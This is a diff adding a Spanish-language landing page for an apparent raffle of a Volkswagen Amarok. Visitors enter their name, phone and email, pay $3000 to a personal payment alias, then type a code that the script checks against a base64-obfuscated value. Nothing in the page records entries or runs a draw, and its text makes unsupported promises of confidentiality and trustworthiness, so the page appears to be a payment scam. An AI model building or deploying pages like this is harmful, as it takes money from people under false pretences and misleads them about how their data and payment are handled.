@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sorteo Amarok</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet"/>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    html, body {
+      height: 100%;
+      font-family: 'Montserrat', sans-serif;
+      color: white;
+      text-align: center;
+      overflow-x: hidden;
+    }
+
+    #background-video {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      min-width: 100%;
+      min-height: 100%;
+      width: auto;
+      height: auto;
+      transform: translate(-50%, -50%);
+      object-fit: cover;
+      z-index: -1;
+    }
+
+    header {
+      background-color: rgba(0, 0, 0, 0.6);
+      padding: 30px 20px 10px;
+    }
+
+    header h1 {
+      font-size: 2.5em;
+      margin-bottom: 10px;
+    }
+
+    #confianza {
+      background-color: rgba(0,0,0,0.5);
+      padding: 20px;
+      font-size: 1em;
+      max-width: 800px;
+      margin: auto;
+      border-radius: 12px;
+      margin-top: 15px;
+    }
+
+    section {
+      background-color: rgba(0, 0, 0, 0.4);
+      padding: 30px 20px;
+      margin: 20px auto;
+      border-radius: 12px;
+      max-width: 600px;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 15px;
+      margin-top: 15px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+
+    input {
+      background-color: #fff;
+      color: #000;
+    }
+
+    button {
+      background-color: #ffc107;
+      color: #000;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    button:hover {
+      background-color: #e0a800;
+    }
+
+    .oculto {
+      display: none;
+    }
+
+    #contador {
+      font-size: 1.2em;
+      margin-bottom: 10px;
+      background-color: rgba(0,0,0,0.7);
+      padding: 10px;
+      border-radius: 10px;
+      display: inline-block;
+    }
+  </style>
+</head>
+<body>
+
+  <video autoplay muted loop id="background-video" playsinline>
+    <source src="video-amarok.mp4" type="video/mp4">
+    Tu navegador no soporta videos HTML5.
+  </video>
+
+  <header>
+    <h1>Participá por una Volkswagen Amarok</h1>
+    <div id="contador">Sorteo: 20 de noviembre a las 12hs</div>
+  </header>
+
+  <div id="confianza">
+    Este sitio garantiza total confidencialidad. Todos los datos se procesan de manera segura y con estándares de protección que inspiran confianza en miles de personas cada semana. 
+    Aquí tu participación es clara, segura y directa.
+  </div>
+
+  <section id="datos">
+    <h2>1. Ingresá tus datos</h2>
+    <input type="text" id="nombre" placeholder="Nombre completo" required>
+    <input type="tel" id="numero" placeholder="Número de contacto" required>
+    <input type="email" id="email" placeholder="Correo electrónico" required>
+    <button onclick="guardarDatos()">Enviar</button>
+  </section>
+
+  <section id="comprobante" class="oculto">
+    <h2>2. Realizá el pago de $3000</h2>
+    <p>Alias para enviar el pago: <strong>libro.libro.mp</strong></p>
+    <p>Una vez realizado, presioná el botón para continuar.</p>
+    <button onclick="mostrarCodigo()">Ya pagué</button>
+  </section>
+
+  <section id="codigo" class="oculto">
+    <h2>3. Ingresá tu código</h2>
+    <input type="text" id="codigoIngresado" placeholder="Código de confirmación">
+    <button onclick="verificarCodigo()">Validar</button>
+  </section>
+
+  <section id="final" class="oculto">
+    <h2>¡Estás participando oficialmente!</h2>
+    <p>Gracias por ser parte. Tu participación fue registrada correctamente.</p>
+    <button onclick="volverAlInicio()">Volver al inicio</button>
+  </section>
+
+  <script>
+    function mostrarSeccion(id) {
+      document.querySelectorAll('section').forEach(sec => sec.classList.add('oculto'));
+      document.getElementById(id).classList.remove('oculto');
+    }
+
+    function limpiarFormulario() {
+      document.getElementById("nombre").value = "";
+      document.getElementById("numero").value = "";
+      document.getElementById("email").value = "";
+      document.getElementById("codigoIngresado").value = "";
+    }
+
+    function guardarDatos() {
+      const nombre = document.getElementById("nombre").value.trim();
+      const numero = document.getElementById("numero").value.trim();
+      const email = document.getElementById("email").value.trim();
+
+      if (!nombre || !numero || !email) {
+        alert("Por favor, completá todos los campos.");
+        return;
+      }
+
+      history.pushState({ etapa: "comprobante" }, null, "");
+      mostrarSeccion("comprobante");
+    }
+
+    function mostrarCodigo() {
+      history.pushState({ etapa: "codigo" }, null, "");
+      mostrarSeccion("codigo");
+    }
+
+    // Código ofuscado para validación
+    const _0x4f2a = ['QU01NjdB', 'dHJpbQ==', 'Q8OzZGlnbyBpbmNvcnJlY3RvLiBSZXZpc8OhIHR1IGNvcnJlby4='];
+    function verificarCodigo() {
+      const codigo = document.getElementById("codigoIngresado").value.trim();
+      const codigoCorrecto = atob(_0x4f2a[0]);
+      if (codigo === codigoCorrecto) {
+        history.pushState({ etapa: "final" }, null, "");
+        mostrarSeccion("final");
+      } else {
+        alert(atob(_0x4f2a[2]));
+      }
+    }
+
+    function volverAlInicio() {
+      limpiarFormulario();
+      history.pushState(null, null, window.location.pathname);
+      mostrarSeccion("datos");
+    }
+
+    window.onpopstate = function(event) {
+      if (event.state && event.state.etapa) {
+        mostrarSeccion(event.state.etapa);
+      } else {
+        limpiarFormulario();
+        mostrarSeccion("datos");
+      }
+    };
+  </script>
+
+</body>
+</html>
